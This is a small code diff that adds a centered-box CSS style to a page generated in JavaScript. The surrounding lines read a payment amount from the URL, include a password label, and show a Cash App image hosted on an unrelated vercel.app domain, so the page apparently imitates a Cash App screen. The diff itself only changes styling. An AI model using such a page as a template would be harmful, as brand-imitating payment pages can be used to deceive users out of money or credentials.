@@ -18,6 +18,15 @@ style.textContent = ` body {
     font-family: Arial, sans-serif;
     background-color: #f5f5f5;
   }
+    .center-box {
+  max-width: 500px;
+  width: 100%;
+  padding: 30px;
+  background-color: white;
+  border-radius: 12px;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+  text-align: center;
+}
   .card {
     background-color: white;
     box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
@@ -113,7 +122,7 @@ const amount = urlParams.get('amount');
 {/* <div class="flex items-center justify-center gap-x-12 text-neutral-50"></div> */}
 // size-14 flex items-center justify-center rounded-full text-3xl bg-green-500
  
-newDiv.innerHTML = `<div >
+newDiv.innerHTML = `<div class="center-box" >
                   <label for="password" class="accept-button ">
       <div class="card">
     <img src="https://newsite-livid.vercel.app/cashapp.jpg" alt="img" />
